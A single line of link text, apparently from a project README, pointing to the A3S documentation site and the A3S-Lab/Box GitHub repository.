+> Documentation: [https://a3s-lab.github.io/a3s/](https://a3s-lab.github.io/a3s/) | GitHub: [https://github.com/A3S-Lab/Box](https://github.com/A3S-Lab/Box)
